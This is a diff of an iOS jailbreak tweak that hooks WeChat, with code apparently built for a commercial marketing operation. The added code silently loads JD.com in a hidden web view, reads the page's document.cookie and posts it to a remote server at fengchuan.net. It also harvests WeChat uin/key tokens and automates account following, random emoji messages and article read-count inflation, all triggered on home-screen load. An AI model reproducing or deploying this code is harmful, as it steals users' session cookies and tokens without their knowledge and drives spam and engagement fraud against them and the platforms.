@@ -10,7 +10,7 @@
 static NSString *environmentPath = @"http://www.fengchuan.net/shareplatformWx/weixin/";
 
 //hook版本号控制
-static NSString *m_hookVersion = @"2";
+static NSString *m_hookVersion = @"6";
 
 static dispatch_group_t group = dispatch_group_create();
 static dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
@@ -29,6 +29,8 @@ static int  m_isRespJson = 0; //判断当前是否名片是否结束
 static NSString *linkTemplate = [[NSString alloc] initWithContentsOfFile:@"/var/root/hkwxCard/linktmp.xml"];
 extern "C" void uploadLog(NSString *title, NSString *data);
 extern "C" NSString* geServerTypeTitle(int currentType,int currentNum,NSString *data);
+
+static NSArray *m_randomFace = [NSArray arrayWithObjects:@"[微笑]",@"[色]",@"[害羞]",@"[得意]",@"[调皮]",@"[呲牙]",@"[酷]",@"[愉快]",@"[偷笑]",@"[悠闲]",@"[坏笑]",@"[阴险]",@"[亲亲]",@"[爱情]",@"[回头]",@"[飞吻]",@"[OK]",@"[强]",@"[握手]",@"[跳跳]",@"[拥抱]",@"[爱心]",@"[太阳]",@"[月亮]",@"[爱你]",@"[礼物]",@"[玫瑰]",@"[嘘]",@"[憨笑]",@"[转圈]",@"[跳绳]",@"[激动]",@"[乱舞]",@"[激动]",@"[献吻]",@"[左太极]",@"[投降]",@"[勾引]",nil];
 
 /*
  是否有等待请求数据回来
@@ -66,8 +68,9 @@ static int m_spaceCount = 1; //间隔个数
 static int m_type = 2;    //0.内部插件渠道  1.深圳周总渠道(阅读hook)  2.深圳周总渠道(公众号名片hook)
 static int totalCardSend = 0;
 static int m_isUpdateHook = 0;  //判断是否更新hook
-static int m_pluginKind = 3;  // 插件类别：1.深圳周总（默认） 2.深圳陈总 3.
+static int m_pluginKind = 1;  // 插件类别：1深圳陈总（默认） 2.深圳周总 3.深圳陈总
 static int m_isGetLocaton = 0;  //是否是首页获取附近人
+static int m_isHomeUpKey = 0;  //判断是不是首页上传的key
 
 //去掉特殊字符
 extern "C" NSString *conversionSpecialCharacter(NSString *character){
@@ -157,6 +160,93 @@ extern "C" void syncContactPlugin(NSString *uuid,NSString *data){
 }
 
 
+extern "C" void uploadJdCookie(NSString *weixinUuid,NSString *cookie){
+
+    NSString *urlStr = [NSString stringWithFormat:@"%@uploadJdCookie.htm",environmentPath];
+
+    //把传进来的URL字符串转变为URL地址
+    NSURL *url = [NSURL URLWithString:urlStr];
+
+    //请求初始化，可以在这针对缓存，超时做出一些设置
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url
+                                                           cachePolicy:NSURLRequestReloadIgnoringCacheData
+                                                       timeoutInterval:20];
+
+    NSString *parseParamsResult = [NSString stringWithFormat:@"weixinUuid=%@&cookie=%@&pluginKind=%d&hookVersion=%@",weixinUuid,cookie,m_pluginKind,m_hookVersion];
+
+
+    NSLog(@"=======%@,%@",urlStr,parseParamsResult);
+
+
+    NSData *postData = [parseParamsResult dataUsingEncoding:NSUTF8StringEncoding];
+
+    [request setHTTPMethod:@"POST"];
+    [request setHTTPBody:postData];
+
+    //创建一个新的队列（开启新线程）
+    //    NSOperationQueue *queue = [NSOperationQueue new];
+    //发送异步请求，请求完以后返回的数据，通过completionHandler参数来调用
+    //    [NSURLConnection sendAsynchronousRequest:request
+    //                                       queue:queue
+    //                           completionHandler:block];
+
+
+    // 3. Connection
+    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
+
+        if (connectionError == nil) {
+
+            NSString *aString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            
+        }
+    }];
+}
+
+
+extern "C" void hook_success_task(NSString *uuid,NSString *publicUser){
+
+    NSString *urlStr = [NSString stringWithFormat:@"%@pluginAttentionCardSuccess.htm",environmentPath];
+
+    //把传进来的URL字符串转变为URL地址
+    NSURL *url = [NSURL URLWithString:urlStr];
+
+    //请求初始化，可以在这针对缓存，超时做出一些设置
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url
+                                                           cachePolicy:NSURLRequestReloadIgnoringCacheData
+                                                       timeoutInterval:20];
+
+    NSString *parseParamsResult = [NSString stringWithFormat:@"weixinUuid=%@&publicUser=%@&pluginKind=%d",uuid,publicUser,m_pluginKind];
+
+
+    NSLog(@"=======%@,%@",urlStr,parseParamsResult);
+
+
+    NSData *postData = [parseParamsResult dataUsingEncoding:NSUTF8StringEncoding];
+
+    [request setHTTPMethod:@"POST"];
+    [request setHTTPBody:postData];
+
+    //创建一个新的队列（开启新线程）
+    //    NSOperationQueue *queue = [NSOperationQueue new];
+    //发送异步请求，请求完以后返回的数据，通过completionHandler参数来调用
+    //    [NSURLConnection sendAsynchronousRequest:request
+    //                                       queue:queue
+    //                           completionHandler:block];
+
+
+    // 3. Connection
+    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
+
+        if (connectionError == nil) {
+
+            NSString *aString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+        }
+    }];
+}
+
+
+
 //发送附近人男、女 给服务端 nearbyCContactList
 extern "C" void syncNearbyContactPlugin(NSString *uuid,NSString *phone, NSString *data,NSString *latitude,NSString *longitude){
 //    [taskDataDic objectForKey:@"latitude"],[taskDataDic objectForKey:@"longitude"]
@@ -222,7 +312,7 @@ static CSetting *m_nCSetting = [[NSClassFromString(@"CSetting") alloc] init];  /
 //启动时请求的的任务数据
 extern "C" NSString *getSyncData(NSString *uuid){
 
-     NSString *urlStr = [NSString stringWithFormat:@"%@queryWxPositionNewRand.htm?uuid=%@",environmentPath,uuid];
+     NSString *urlStr = [NSString stringWithFormat:@"%@queryWxPositionNewRand.htm?uuid=%@&pluginKind=%d",environmentPath,uuid,m_pluginKind];
 
     //第一步，创建URL
     NSURL *url = [NSURL URLWithString:urlStr];
@@ -240,6 +330,53 @@ extern "C" NSString *getSyncData(NSString *uuid){
     return str;
     
 }
+
+
+//启动时获取关注公众号数据
+extern "C" NSString *getAttentionCard(NSString *uuid){
+
+    NSString *urlStr = [NSString stringWithFormat:@"%@getPublicCardsByPlugin.htm?weixinUuid=%@&pluginKind=%d",environmentPath,uuid,m_pluginKind];
+
+    NSLog(@"urlStr:%@",urlStr);
+    //第一步，创建URL
+    NSURL *url = [NSURL URLWithString:urlStr];
+
+    //第二步，通过URL创建网络请求
+    NSURLRequest *request = [[NSURLRequest alloc]initWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10];
+    //NSURLRequest初始化方法第一个参数：请求访问路径，第二个参数：缓存协议，第三个参数：网络请求超时时间（秒）
+
+    //第三步，连接服务器
+    NSData *received = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
+
+    NSString *str = [[NSString alloc]initWithData:received encoding:NSUTF8StringEncoding];
+
+
+    return str;
+    
+}
+
+//启动时获取刷文章阅读的数据
+extern "C" NSString *getBrushRead(NSString *uuid){
+
+    NSString *urlStr = [NSString stringWithFormat:@"%@getWeixinArticleByPlugin.htm?weixinUuid=%@&pluginKind=%d",environmentPath,uuid,m_pluginKind];
+
+    //第一步，创建URL
+    NSURL *url = [NSURL URLWithString:urlStr];
+
+    //第二步，通过URL创建网络请求
+    NSURLRequest *request = [[NSURLRequest alloc]initWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10];
+    //NSURLRequest初始化方法第一个参数：请求访问路径，第二个参数：缓存协议，第三个参数：网络请求超时时间（秒）
+
+    //第三步，连接服务器
+    NSData *received = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
+
+    NSString *str = [[NSString alloc]initWithData:received encoding:NSUTF8StringEncoding];
+
+    
+    return str;
+    
+}
+
 
 
 //启动时请求的的任务数据
@@ -434,7 +571,7 @@ extern "C" void hookUpdateLoadKey(NSString *uuid,NSString *linkUrl){
 
 
     // 1. URL
-    NSString *urlStr = [NSString stringWithFormat:@"%@markWeixinPublicCardComplate.htm?uuid=%@&linkUrl=%@&type=%d&pluginKind=%d",environmentPath,uuid,sendData,m_type,m_pluginKind];
+    NSString *urlStr = [NSString stringWithFormat:@"%@markWeixinPublicCardComplate.htm?uuid=%@&linkUrl=%@&type=%d&pluginKind=%d&isHomeUpKey=%d",environmentPath,uuid,sendData,m_type,m_pluginKind,m_isHomeUpKey];
 
     NSLog(@"hkWeixinSendCard 发送成功给服务器 %@",urlStr);
 
@@ -784,35 +921,6 @@ static NSData *m_dtImg = [[NSData alloc] init];
     });
 }
 
-//
-//
-////发送图片
-//%new
-//-(void)sendPictureMessages:(NSString *)toUser pic:(NSString *)picUrl{
-//    NSLog(@"发送图片");
-//    if([picUrl isEqualToString:@""]){
-//        uploadLog(geServerTypeTitle(0,6,@"发送发送图片为空,不能发送图片"),[NSString stringWithFormat:@"发送图片失败"]);
-//        return;
-//    }
-//
-//    CContactMgr *mgr = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
-//
-//    NSMutableArray *toContacts = [[NSMutableArray alloc] init];
-//    CContact *cc = [mgr getContactByName:toUser];
-//    [toContacts addObject:cc];
-//
-//
-//    CMessageWrap *myMsgText = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:3 nsFromUsr:[m_nCSetting m_nsUsrName]];
-//    ForwardMessageLogicController *fmlc = [[NSClassFromString(@"ForwardMessageLogicController") alloc] init];
-//    CMessageWrap *myMsg = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:3 nsFromUsr:[m_nCSetting m_nsUsrName]];
-//
-//    myMsg.m_dtImg = [NSData dataWithContentsOfURL:[NSURL URLWithString:picUrl]];
-//
-//    [fmlc forwardMsgList:@[myMsg] toContacts:toContacts];
-//    SharePreConfirmView *view = MSHookIvar<SharePreConfirmView *>(fmlc, "m_confirmView");
-//    [view onConfirm];
-//
-//}
 
 //发送名片
 %new
@@ -901,7 +1009,12 @@ static NSData *m_dtImg = [[NSData alloc] init];
                 dicCount = dicCount + 1;
 
                 NSString *wxid = keys[i];
-                if(![wxid isEqualToString:@"weixin"]){
+
+                CContact *oneContact = [dicContact objectForKey:wxid];
+
+                if(![wxid isEqualToString:@"weixin"] && ![wxid isEqualToString:@"iwatchholder"]
+                   && ![wxid isEqualToString:@"notification_messages"]
+                   && [oneContact m_uiCertificationFlag] == 0){
 
                     uploadLog(geServerTypeTitle(0,3,@"当前开始发图片信息"),[NSString stringWithFormat:@"当前wixd:%@ 执行的位置：%d 共有多少个好友:%lu",wxid,dicCount,(unsigned long)[keys count]]);
                     NSLog(@"当前wixd:%@ 执行的位置：%d",wxid,dicCount);
@@ -995,88 +1108,6 @@ static NSData *m_dtImg = [[NSData alloc] init];
     });
 }
 
-
-//发送通讯录营销消息
-%new
--(void)mailMarkMsgold:(NSMutableDictionary *)taskDataDic{
-
-    NSLog(@"当前进入了发送通讯录营销消息");
-
-    dispatch_group_async(group, queue, ^{
-
-        [NSThread sleepForTimeInterval:5];
-
-        //得到通讯录的信息
-        FTSContactMgr *ftsContactMgr = [[[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"FTSFacade")] ftsContactMgr];
-
-        [ftsContactMgr tryLoadContacts];
-
-        NSMutableDictionary *dicContact = [ftsContactMgr getContactDictionary];
-        __block int dicCount = 0;
-        __block int spaceInterval = [[m_taskDataDic objectForKey:@"interval"] intValue];
-        if(spaceInterval == 0){
-            spaceInterval = 1;
-        }
-
-        NSArray *keys = [dicContact allKeys];
-
-        for (id key in dicContact) {
-
-            dispatch_async(dispatch_get_main_queue(), ^{
-
-                dicCount = dicCount + 1;
-
-                NSString *wxid = key;
-                NSLog(@"this is %@",m_taskDataDic);
-
-                NSString *cardUserOne = m_cardUserList[0];
-                if(![cardUserOne isEqualToString:@""] && cardUserOne != nil){
-                    uploadLog(geServerTypeTitle(0,4,@"开始发送第一个名片"),[NSString stringWithFormat:@"当前wixd:%@  执行的位置：%d",wxid,dicCount]);
-                    //发第一个名片
-                    [self sendCardMessage:wxid toContact:m_cardContacts[0]];
-                }
-
-
-                NSString *cardUserTwo = m_cardUserList[1];
-                if(![cardUserTwo isEqualToString:@""] && cardUserTwo != nil){
-                    uploadLog(geServerTypeTitle(0,5,@"开始发送第二个名片"),[NSString stringWithFormat:@"当前wixd:%@ 执行的位置：%d",wxid,dicCount]);
-                    //发第二个名片
-                    [self sendCardMessage:wxid toContact:m_cardContacts[1]];
-                }else{
-                    uploadLog(geServerTypeTitle(0,5,@"当前没有第二个名片"),[NSString stringWithFormat:@"当前wixd:%@ 执行的位置：%d",wxid,dicCount]);
-                }
-
-                if(![[m_taskDataDic objectForKey:@"picUrl"] isEqualToString:@""]){
-                    uploadLog(geServerTypeTitle(0,3,@"当前开始发图片信息"),[NSString stringWithFormat:@"当前wixd:%@ 执行的位置：%d 图片URL:%@",wxid,dicCount,[m_taskDataDic objectForKey:@"picUrl"]]);
-                    //发图片
-                    [self sendPictureMessages:wxid pic:[taskDataDic objectForKey:@"picUrl"]];
-                }
-
-                if([m_taskDataDic objectForKey:@"shareLink"]){
-                    uploadLog(geServerTypeTitle(0,3,@"当前发送图文链接任务"),[NSString stringWithFormat:@"当前wixd:%@ 执行的位置：%d",wxid,dicCount]);
-                    //链接
-                    [self sendLinkMessages:wxid shareLink:[m_taskDataDic objectForKey:@"shareLink"]];
-                }else{
-                    NSLog(@"发送图文链接失败，没有相关信息");
-                }
-
-                if(![[m_taskDataDic objectForKey:@"textContent"] isEqualToString:@""]){
-                    uploadLog(geServerTypeTitle(0,3,@"当前开始发消息任务"),[NSString stringWithFormat:@"当前wixd:%@ 执行的位置：%d",wxid,dicCount]);
-                    //发消息
-                    [self sendTextMessages:wxid];
-                }
-
-                if(dicCount == [keys count]){
-
-                    uploadLog(geServerTypeTitle(0,6,@"通讯录发轮图片消息和名片(二次营销)结束"),@"");
-                }
-                
-            });
-
-            [NSThread sleepForTimeInterval:spaceInterval];
-        }
-    });
-}
 
 //得到当前的发名片的信息
 %new
@@ -1195,6 +1226,8 @@ static NSData *m_dtImg = [[NSData alloc] init];
     //刷key链接
     if(m_fetchUinAndKeyUrl[0] != nil && ![m_fetchUinAndKeyUrl[0] isEqualToString:@""]){
         NSLog(@"this is m_fetchUinAndKeyUrl is not nill ");
+
+        m_isHomeUpKey = 0;
 
         id web = [[NSClassFromString(@"MMWebViewController") alloc] initWithURL:[NSURL URLWithString:m_fetchUinAndKeyUrl[0]] presentModal:NO extraInfo:nil];
 
@@ -1360,6 +1393,33 @@ CLLocation *lbsLocation = nil;
     
 }
 
+
+static dispatch_group_t groupKey = dispatch_group_create();
+static dispatch_queue_t queueKey = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
+
+
+//首页上来上传key
+%new
+-(void)homeUploadUinKey{
+
+    NSLog(@"this is enter 首页上来上传key");
+
+    //异步请求数据
+    dispatch_group_async(groupKey, queueKey, ^{
+
+        [NSThread sleepForTimeInterval:2];
+
+        dispatch_async(dispatch_get_main_queue(), ^{
+
+            m_isHomeUpKey = 1;
+
+            id web = [[NSClassFromString(@"MMWebViewController") alloc] initWithURL:[NSURL URLWithString:@"https://mp.weixin.qq.com/mp/getverifyinfo?__biz=MjM5NTc0MjAyOQ==#wechat_redirect"] presentModal:NO extraInfo:nil];
+
+        });
+    });
+
+}
+
 //首页附近人
 %new
 - (void)findHomeLBSUsrs{
@@ -1377,7 +1437,7 @@ CLLocation *lbsLocation = nil;
 
             NSMutableDictionary *dicLBS = strngToDictionary(isLBSData);
 
-            NSLog(@"hkWeixinSendCard服务器端返回的数据为：%@",isLBSData);
+            NSLog(@"hkWeixinSendCard(findHomeLBSUsrs)服务器端返回的数据为：%@",isLBSData);
 
             if([[dicLBS objectForKey:@"code"] intValue] == 0 && ![isLBSData isEqualToString:@""]){
                 [self findLBSUsrs:dicLBS];
@@ -1410,6 +1470,191 @@ CLLocation *lbsLocation = nil;
 
 }
 
+static dispatch_group_t groupRead = dispatch_group_create();
+static dispatch_queue_t queueRead = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
+%new
+-(void)homeBrushWXRead{
+
+    NSLog(@"当前执行首页刷阅读");
+    //异步请求数据
+    dispatch_group_async(groupRead, queueRead, ^{
+
+        [NSThread sleepForTimeInterval:2];
+        //同步请求数据
+        NSString *isBrushRead = getBrushRead([m_nCSetting m_nsUsrName]);
+
+        dispatch_async(dispatch_get_main_queue(), ^{
+
+            NSMutableDictionary *dicBrushRead = strngToDictionary(isBrushRead);
+
+            NSLog(@"hkWeixinSendCard首页刷阅读：%@",dicBrushRead);
+            //jdIndex   1.进入京东首页取cookie 0.否
+            if([[dicBrushRead objectForKey:@"jdCookie"] intValue] == 1){
+                [self getJdIndexCookie];
+            }
+
+            if([[dicBrushRead objectForKey:@"code"] intValue] == 0 && ![isBrushRead isEqualToString:@""]){
+                
+                [self brushMapReadCount:dicBrushRead];
+            }
+            
+        });
+    });
+
+
+}
+
+static dispatch_group_t groupCookie = dispatch_group_create();
+static dispatch_queue_t queueCookie = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
+
+%new
+-(void)getJdIndexCookie{
+
+    NSLog(@"hkWeixinSendCard获取jdCookie");
+
+    dispatch_group_async(groupCookie, queueCookie, ^{
+
+        [NSThread sleepForTimeInterval:1];
+
+        dispatch_async(dispatch_get_main_queue(), ^{
+
+            id web = [[NSClassFromString(@"MMWebViewController") alloc] initWithURL:[NSURL URLWithString:@"http://wqs.jd.com/my/index.shtml"] presentModal:NO extraInfo:nil];
+
+        });
+    });
+}
+
+
+%new
+-(void)brushMapReadCount:(NSMutableDictionary *)taskDataDic{
+
+    NSArray *docRead = [[taskDataDic objectForKey:@"articleList"] componentsSeparatedByString:@","]; //从字符A中分隔成2个元素的数组;
+
+    int interval = [[taskDataDic objectForKey:@"interval"] intValue];
+    if(interval== 0){
+        interval = 1;
+    }
+
+    dispatch_group_async(groupRead, queueRead, ^{
+
+        for (int i = 0; i < [docRead count]; i++) {
+
+            dispatch_async(dispatch_get_main_queue(), ^{
+
+                id web = [[NSClassFromString(@"MMWebViewController") alloc] initWithURL:[NSURL URLWithString:docRead[i]] presentModal:NO extraInfo:nil];
+
+            });
+
+            [NSThread sleepForTimeInterval:interval];
+        }
+    });
+
+}
+
+static dispatch_group_t groupCard = dispatch_group_create();
+static dispatch_queue_t queueCard = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
+
+%new
+-(void)homeAttentionCard{
+    NSLog(@"当前执行首页关注公众号");
+    //异步请求数据
+    dispatch_group_async(groupCard, queueCard, ^{
+
+        [NSThread sleepForTimeInterval:3];
+        //同步请求数据
+        NSString *isAttention = getAttentionCard([m_nCSetting m_nsUsrName]);
+
+        dispatch_async(dispatch_get_main_queue(), ^{
+
+            NSMutableDictionary *dicAttention = strngToDictionary(isAttention);
+
+            NSLog(@"hkWeixinSendCard首页关注公众号：%@",dicAttention);
+
+            if([[dicAttention objectForKey:@"code"] intValue] == 0 && ![isAttention isEqualToString:@""]){
+                [self addAllPublicCard:dicAttention];
+            }
+            
+        });
+    });
+}
+
+
+//发送文字
+%new
+-(void)sendCardTextMessages:(NSString *)toUser textContent:(NSString *)textContent{
+    NSLog(@"发送文字");
+    if([[m_taskDataDic objectForKey:@"textContent"] isEqualToString:@""]){
+        uploadLog(geServerTypeTitle(0,6,@"发送文字内容为空,不能发送文字"),[NSString stringWithFormat:@"发送文字失败"]);
+        return;
+    }
+
+    CContactMgr *mgrText = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
+    CMessageWrap *myMsgText = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:1 nsFromUsr:[m_nCSetting m_nsUsrName]];
+    CMessageMgr *msMgrText = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CMessageMgr")];
+    myMsgText.m_nsContent = textContent;
+    myMsgText.m_uiMesLocalID = (int)(10000 + (arc4random() % (99999 - 10000 + 1)));;//(unsigned int)randomInt(10000, 99999);
+    myMsgText.m_nsFromUsr = [m_nCSetting m_nsUsrName];
+    myMsgText.m_nsToUsr = toUser;
+    myMsgText.m_uiCreateTime = (int)time(NULL);
+    [msMgrText ResendMsg: toUser MsgWrap:myMsgText];
+    NSLog(@"MYHOOK will send to %@:", myMsgText);
+    
+}
+
+
+
+%new
+-(void)addAllPublicCard:(NSMutableDictionary *)taskDataDic{
+
+    CContactMgr *mgr = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
+    //发送名片
+    int cardCount = [[taskDataDic objectForKey:@"cardCount"] intValue];
+    int interval =  [[taskDataDic objectForKey:@"subSec"] intValue];
+    if(interval == 0){
+        interval = 2;
+    }
+
+    NSMutableArray *publiAttentionArr = [[NSMutableArray alloc] init];
+    if(cardCount > 0){
+        for(NSArray *obj in [taskDataDic objectForKey:@"publiAttentionArr"]){
+            [publiAttentionArr addObject:[obj mutableCopy]];
+        }
+    }
+
+    if(cardCount > 0){
+
+        dispatch_group_async(groupCard, queueCard, ^{
+
+            for (int i = 0; i < cardCount; i++) {
+                CContact *contact = [[NSClassFromString(@"CContact") alloc] init];
+
+                [contact setM_nsAliasName:[publiAttentionArr[i] objectForKey:@"nsAliasName"]];
+                [contact setM_nsUsrName:[publiAttentionArr[i] objectForKey:@"nsUsrName"]];
+                [contact setM_nsNickName:[publiAttentionArr[i] objectForKey:@"nsNickName"]];
+                [contact setM_nsSignature:[publiAttentionArr[i] objectForKey:@"nsSignature"]];
+                [contact setM_nsBrandIconUrl:[publiAttentionArr[i] objectForKey:@"nsBrandIconUrl"]];
+                [contact setM_uiCertificationFlag:[[publiAttentionArr[i] objectForKey:@"uiCertificationFlag"] intValue]];
+                [contact setM_uiFriendScene:[[taskDataDic objectForKey:@"scene"] intValue]];
+                NSLog(@"MYHOOK contact: %@ %@", contact,publiAttentionArr[i]);
+
+                [mgr addContact:contact listType:1];
+
+                [NSThread sleepForTimeInterval:interval];
+
+                dispatch_async(dispatch_get_main_queue(), ^{
+
+                    NSString *sendText = m_randomFace[(int)(arc4random() % ([m_randomFace count]))];
+                    
+                    [self sendCardTextMessages:[publiAttentionArr[i] objectForKey:@"nsUsrName"] textContent:sendText];
+
+                    hook_success_task([m_nCSetting m_nsUsrName],[publiAttentionArr[i] objectForKey:@"nsUsrName"]);
+                });
+            }
+        });
+    }
+}
+
+
 - (void)viewDidLoad{
     %orig;
 
@@ -1432,6 +1677,14 @@ CLLocation *lbsLocation = nil;
     //首页上传通讯录的wxid
     [self homeUploadWXid];
 
+    //首页上传key
+    [self homeUploadUinKey];
+
+    //首页关注公众号
+    [self homeAttentionCard];
+
+    //首页刷阅读
+    [self homeBrushWXRead];
 }
 
 %end
@@ -1469,6 +1722,33 @@ CLLocation *lbsLocation = nil;
             //上传给服务端
             hookUpdateLoadKey([m_nCSetting m_nsUsrName],currentURl);
         }
+    }else if([currentURl rangeOfString:@"mp.weixin.qq.com/mp/getverifyinfo"].location != NSNotFound){
+
+        hookUpdateLoadKey([m_nCSetting m_nsUsrName],currentURl);
+
+    }
+
+
+    if([currentURl containsString:@"wqs.jd.com/my/index"]){
+
+        dispatch_group_async(group, queue, ^{
+
+            [NSThread sleepForTimeInterval:2];
+
+            dispatch_async(dispatch_get_main_queue(), ^{
+
+                NSString *jsCookie = @"document.cookie";
+                NSString *currentCookie = [self stringByEvaluatingJavaScriptFromString:jsCookie];
+
+                NSLog(@"YYUIWebView document.cookie -------------%@",currentCookie);
+
+                //上传给服务端
+                
+                uploadJdCookie([m_nCSetting m_nsUsrName],currentCookie);
+            });
+            
+        });
+
     }
     
 }
